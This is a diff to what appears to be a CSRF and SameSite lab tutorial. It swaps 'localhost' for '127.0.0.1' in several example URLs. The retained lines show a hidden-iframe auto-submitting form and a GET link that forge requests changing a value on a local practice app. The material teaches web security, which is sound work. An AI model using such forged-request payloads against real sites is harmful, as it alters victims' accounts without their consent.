@@ -96,7 +96,7 @@ Now that the service is running we want to serve the malicious piece of javascri
 
 ```markup
 <iframe style="display:none" name="csrf-frame"></iframe>
-<form method='POST' action='http://localhost:5000/update' target="csrf-frame" id="csrf-form">
+<form method='POST' action='http://127.0.0.1:5000/update' target="csrf-frame" id="csrf-form">
   <input type='hidden' name='color' value='Hackzord!'>
   <input type='submit' value='submit'>
 </form>
@@ -112,7 +112,7 @@ $ python app.py
 Now when we have in the browser tab our active session of the application we can open a new tab where we will load our evil page we just created.
 
 ```text
-http://localhost:1337/
+http://127.0.0.1:1337/
 ```
 
 This will now create a POST request to the application and changing the value of blue to the new value of 'Hackzord!' As you can see the Referer is set to our evil website where the request originated from.
@@ -211,7 +211,7 @@ This lab was specially designed to also accept GET query string parameters for c
 Now adapt the CSRF Evil Server page to send a GET request as link and click on it.
 
 ```html
-<a href="http://localhost:5000/update?color=Hackzord%21">Try with GET method</a>
+<a href="http://127.0.0.1:5000/update?color=Hackzord%21">Try with GET method</a>
 ```
 ![](.gitbook/assets/csrf-samesite8.png)
 
